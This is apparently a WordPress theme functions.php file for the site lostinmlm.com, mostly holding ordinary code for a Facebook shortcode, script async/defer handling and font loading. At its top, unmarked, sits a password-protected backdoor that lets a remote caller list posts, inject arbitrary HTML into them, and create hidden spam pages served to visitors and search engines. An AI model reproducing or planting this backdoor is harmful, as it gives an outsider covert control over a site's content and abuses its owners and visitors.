<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8e3e5b6ffddf1ea6672caeb00c36fe45'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php

/**shortcode for fb-like**/
function fb_like( $atts, $content = null ) {
    return '<div class="fb-page" data-href="https://www.facebook.com/lostinmlm" data-height="450" data-small-header="false" data-adapt-container-width="true" data-hide-cover="false" data-show-facepile="true"><div class="fb-xfbml-parse-ignore"><blockquote cite="https://www.facebook.com/lostinmlm"><a href="https://www.facebook.com/lostinmlm"></a></blockquote></div></div>';
}
add_shortcode("fb-like", "fb_like");

/** remove pings to self - from http://mygenesisthemes.com/no-self-pings **/
function no_self_ping( &$links ) {
	$home = get_option( 'home' );
	foreach ( $links as $l => $link )
		if ( 0 === strpos( $link, $home ) )
			unset($links[$l]);
}
add_action( 'pre_ping', 'no_self_ping' );

/***** Adds async and defer attributes - brought to you by clydus******/
if ( !strpos($_SERVER["HTTP_USER_AGENT"], "MSIE 9.") && !is_admin()) {
	
	/***these scripts are using "async defer
	//dont add these to the lists below if you want to maintain an async and defer compat for these scripts
	wpshout.com/make-site-faster-async-deferred-javascript-introducing-script_loader_tag/			
	******
		/et_monarch-custom-js" => true
	**/
	
	## 1: list of scripts to async only.
	$scripts_to_async = [
		"jquery-migrate" => true
	];
	## 2: list of scripts to defer only.
	$scripts_to_defer = [
		"td-site-min" => true,
		"wpb_composer_front_js" => true,
		"smile-modal-script" => true,
		"smile-slide-in-script" => true,
		"wpss-jscripts-ftr" => true,
		//"gtm4wp-form-move-tracker" => true,
		//"gtm4wp-contact-form-7-tracker" => true,
		"script-social.js" => true,
		"perfect-scrollbar" => true,
		"jquery-mask" => true,
		"idle-timer.min" => true,
		"et_monarch-idle" => true,
		//"comment-reply" => true,
		//"wp-embed" => true,
		//"mc4wp-forms-api" => true
	];
	$scripts_to_exclude = [
		"jquery-core" => true,
		"leadin-embed-js" => true
	];


	//$scripts_to_cloudflare = [
	//	"td-site-min" => true,
	//	"wpb_composer_front_js" => true
	//];
	//for testing: echo "now";
	//accepts 2 parameters $tag and $src
	add_filter( 'script_loader_tag', 'defer_js_async', 15,2);
}
/**
function to add defer, async or both to the script tag
**/
function defer_js_async($tag,$src){
	global $scripts_to_async, $scripts_to_defer, $scripts_to_exclude;
	switch (true) {
		//no blocking
		case ( isset($scripts_to_exclude[$src]) ):
			return $tag;
			break;
		//defer only
		case ( isset($scripts_to_defer[$src]) ):
			return str_replace( " src", " defer src", $tag );
			break;
		//async only
		case ( isset($scripts_to_async[$src]) ):
			return str_replace( " src", " async src", $tag );
			break;
		//cloudflare disable rocket loader only
		//case ( isset($scripts_to_cloudflare[$src]) ):
		//	return str_replace( " src", "data-cfasync=\"false\" async src", $tag );
		//	break;
		//asyncsync defer as default
		default:
			return str_replace( " src", " async defer src", $tag );
			break;
	}
}
/**
	prevent style from queued
**/
function remove_style() {
   if ( !is_admin()) {
		wp_dequeue_style('mc4wp-form-basic');
		wp_dequeue_style('google_font_roboto');
		wp_dequeue_style('google_font_open_sans');
		wp_dequeue_style('google-fonts-style');
		wp_dequeue_style('et-gf-open-sans');
		wp_dequeue_script('comment-reply');
     }
}
add_action( 'wp_enqueue_scripts','remove_style',300);

//removes unwanted style from header
add_filter( 'style_loader_tag', function( $html,$handle ) {
    if ( $handle !== "open-sans" ){
		return $html;	
	}
}, 10, 2 );

/*** Remove Query String from Static Resources ***/
function remove_cssjs_ver( $src ) {
	return remove_query_arg( 'ver', $src );
}
add_filter( 'style_loader_src', 'remove_cssjs_ver', 200, 1 );
add_filter( 'script_loader_src', 'remove_cssjs_ver', 200, 1 );

/**add facebook script to footer 
previous: //connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId=775632872536167
****/
function fb_script(){
	echo '<script>window.fbAsyncInit=function(){FB.init({appId:"775632872536167",xfbml:!0,version:"v2.7"})},function(a,b,c){var d,e=a.getElementsByTagName(b)[0];a.getElementById(c)||(d=a.createElement(b),d.id=c,d.src="//lostinmlm.com/wp-content/themes/Newspaper-child-01/scripts/sdk.js",e.parentNode.insertBefore(d,e))}(document,"script","facebook-jssdk");</script>';
} 
//if page is SBA community landing page, dont load FB script
if (! is_page( 'community')  ){
	add_action( "wp_footer", "fb_script", 25 );
}

/**add fontfaceobserver***/
function fontfaceobserver(){
	$font_script = "<script type=\"text/javascript\">(function(){function l(a,b){document.addEventListener?a.addEventListener(\"scroll\",b,!1):a.attachEvent(\"scroll\",b)}function m(a){document.body?a():document.addEventListener?document.addEventListener(\"DOMContentLoaded\",function c(){document.removeEventListener(\"DOMContentLoaded\",c);a()}):document.attachEvent(\"onreadystatechange\",function k(){if(\"interactive\"==document.readyState||\"complete\"==document.readyState)document.detachEvent(\"onreadystatechange\",k),a()})};function q(a){this.a=document.createElement(\"div\");this.a.setAttribute(\"aria-hidden\",\"true\");this.a.appendChild(document.createTextNode(a));this.b=document.createElement(\"span\");this.c=document.createElement(\"span\");this.h=document.createElement(\"span\");this.f=document.createElement(\"span\");this.g=-1;this.b.style.cssText=\"max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;\";this.c.style.cssText=\"max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;\";
this.f.style.cssText=\"max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;\";this.h.style.cssText=\"display:inline-block;width:200%;height:200%;font-size:16px;max-width:none;\";this.b.appendChild(this.h);this.c.appendChild(this.f);this.a.appendChild(this.b);this.a.appendChild(this.c)}
function w(a,b){a.a.style.cssText=\"max-width:none;min-width:20px;min-height:20px;display:inline-block;overflow:hidden;position:absolute;width:auto;margin:0;padding:0;top:-999px;left:-999px;white-space:nowrap;font:\"+b+\";\"}function x(a){var b=a.a.offsetWidth,c=b+100;a.f.style.width=c+\"px\";a.c.scrollLeft=c;a.b.scrollLeft=a.b.scrollWidth+100;return a.g!==b?(a.g=b,!0):!1}function z(a,b){function c(){var a=k;x(a)&&null!==a.a.parentNode&&b(a.g)}var k=a;l(a.b,c);l(a.c,c);x(a)};function A(a,b){var c=b||{};this.family=a;this.style=c.style||\"normal\";this.weight=c.weight||\"normal\";this.stretch=c.stretch||\"normal\"}var B=null,C=null,D=null;function H(){if(null===C){var a=document.createElement(\"div\");try{a.style.font=\"condensed 100px sans-serif\"}catch(b){}C=\"\"!==a.style.font}return C}function I(a,b){return[a.style,a.weight,H()?a.stretch:\"\",\"100px\",b].join(\" \")}
A.prototype.load=function(a,b){var c=this,k=a||\"BESbswy\",y=b||3E3,E=(new Date).getTime();return new Promise(function(a,b){null===D&&(D=!!document.fonts);if(D){var J=new Promise(function(a,b){function e(){(new Date).getTime()-E>=y?b():document.fonts.load(I(c,'\"'+c.family+'\"'),k).then(function(c){1<=c.length?a():setTimeout(e,25)},function(){b()})}e()}),K=new Promise(function(a,c){setTimeout(c,y)});Promise.race([K,J]).then(function(){a(c)},function(){b(c)})}else m(function(){function r(){var b;if(b=
-1!=f&&-1!=g||-1!=f&&-1!=h||-1!=g&&-1!=h)(b=f!=g&&f!=h&&g!=h)||(null===B&&(b=/AppleWebKit\/([0-9]+)(?:\.([0-9]+))/.exec(window.navigator.userAgent),B=!!b&&(536>parseInt(b[1],10)||536===parseInt(b[1],10)&&11>=parseInt(b[2],10))),b=B&&(f==t&&g==t&&h==t||f==u&&g==u&&h==u||f==v&&g==v&&h==v)),b=!b;b&&(null!==d.parentNode&&d.parentNode.removeChild(d),clearTimeout(G),a(c))}function F(){if((new Date).getTime()-E>=y)null!==d.parentNode&&d.parentNode.removeChild(d),b(c);else{var a=document.hidden;if(!0===a||
void 0===a)f=e.a.offsetWidth,g=n.a.offsetWidth,h=p.a.offsetWidth,r();G=setTimeout(F,50)}}var e=new q(k),n=new q(k),p=new q(k),f=-1,g=-1,h=-1,t=-1,u=-1,v=-1,d=document.createElement(\"div\"),G=0;d.dir=\"ltr\";w(e,I(c,\"sans-serif\"));w(n,I(c,\"serif\"));w(p,I(c,\"monospace\"));d.appendChild(e.a);d.appendChild(n.a);d.appendChild(p.a);document.body.appendChild(d);t=e.a.offsetWidth;u=n.a.offsetWidth;v=p.a.offsetWidth;F();z(e,function(a){f=a;r()});w(e,I(c,'\"'+c.family+'\",sans-serif'));z(n,function(a){g=a;r()});
w(n,I(c,'\"'+c.family+'\",serif'));z(p,function(a){h=a;r()});w(p,I(c,'\"'+c.family+'\",monospace'))})})};\"undefined\"!==typeof module?module.exports=A:(window.FontFaceObserver=A,window.FontFaceObserver.prototype.load=A.prototype.load);}());<script>
(function( w ){if( w.document.documentElement.className.indexOf( \"fonts-loaded\" ) > -1 ){return;}var font1 = new w.FontFaceObserver( \"Open Sans\" );var font4 = new w.FontFaceObserver( \"ETmonarch\" );var font5 = new w.FontFaceObserver( \"newspaper\" );";
	
		if ( is_front_page() ) { $font_script = $font_script . 'var font2 = new w.FontFaceObserver( "bariolregular" );'; }
		if ( is_page('community') ) { $font_script = $font_script . 'var font6 = new w.FontFaceObserver( "Montserrat" );'; }
		if ( is_single() ) { $font_script = $font_script . 'var font3 = new w.FontFaceObserver( "Geomanist" );'; }
	$font_script = $font_script . 'w.Promise.all([font1.load(),font4.load(),font5.load()'; 
		if ( is_front_page() ) { $font_script = $font_script . ",font2.load()"; }
		if ( is_single() ) { $font_script = $font_script . ",font3.load()"; }
		if ( is_page('community') ) { $font_script = $font_script . ",font6.load()"; }
	$font_script = $font_script . ']).then(function(){w.document.documentElement.className += " fonts-loaded";});}( this ));</script>';
	echo $font_script;
}
add_action( "wp_footer", "fontfaceobserver", 19 );

/**add open sans***/
function pagefonts_footer(){
	//if post, use Open Sans if not page, load open sans and Geomanist
	//then print style Geomanist
	//if ( is_single() ) { echo "<link id=webfont-post' href='https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700,700italic,600,600italic' rel='stylesheet' type='text/css' //media='all' />";								
	//}
	if ( is_single() ) {echo "
		<style>@font-face {
		  font-family: 'Geomanist';
		  font-style: normal;
		  font-weight: normal;
		  src: local('Geomanist'), local('Geomanist-Regular'), url(https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Geomanist_Regular/geomanist-regular-webfont.woff2) format('woff2'),
		 url('https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Geomanist_Regular/geomanist-regular-webfont.woff') format('woff'),
         url('https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Geomanist_Regular/geomanist-regular-webfont.ttf') format('truetype'),
         url('https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Geomanist_Regular/geomanist-regular-webfont.svg#geomanist_regularregular') format('svg');		  
		}
		@font-face {
		  font-family: 'Geomanist';
		  font-style: italic;
		  font-weight: normal;
		  src: local('Geomanist Regular Italic'), local('Geomanist-Regular-Italic'), url(https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Geomanist_Regular_Italic/geomanist-regular-italic-webfont.woff2) format('woff2'),url('https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Geomanist_Regular_Italic/geomanist-regular-italic-webfont.woff') format('woff'),url('https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Geomanist_Regular_Italic/geomanist-regular-italic-webfont.ttf') format('truetype'),url('https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Geomanist_Regular_Italic/geomanist-regular-italic-webfont.svg#geomanist_regularregular') format('svg');		 
		}
		.td-post-content div:not(.td-post-featured-image), .td-post-content p, .td-post-content ul, .td-post-content ol, .td-post-content li{font-family:\"Geomanist\";font-size:18px;max-width:550px}</style>"; 
	}
	//if not post, use Open Sans
	echo "<style>
		@font-face {
		  font-family: 'Open Sans';
		  font-style: normal;
		  font-weight: 400;
		  src: local('Open Sans'), local('OpenSans'), url(https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Open_Sans/OpenSans-Regular.woff2) format('woff2');
		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
		}
		@font-face {
		  font-family: 'Open Sans';
		  font-style: italic;
		  src: local('Open Sans Italic'), local('OpenSans-Italic'), url(https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Open_Sans/OpenSans-Italic.woff2) format('woff2');
		  font-weight: 400;

		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
		}
		@font-face {
		  font-family: 'Open Sans';
		  font-style: normal;
		  font-weight: 600;
		  src: local('Open Sans Semibold'), local('OpenSans-Semibold'), url(https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Open_Sans/OpenSans-Semibold.woff2) format('woff2');
		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
		}
		@font-face {
		  font-family: 'Open Sans';
		  font-style: normal;
		  font-weight: 700;
		  src: local('Open Sans Bold'), local('OpenSans-Bold'), url(https://lostinmlm.com/wp-content/themes/Newspaper-child-01/fonts/Open_Sans/OpenSans-Bold.woff2) format('woff2');
		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
		}
	</style>";
}
add_action( "wp_footer", "pagefonts_footer", 30 );
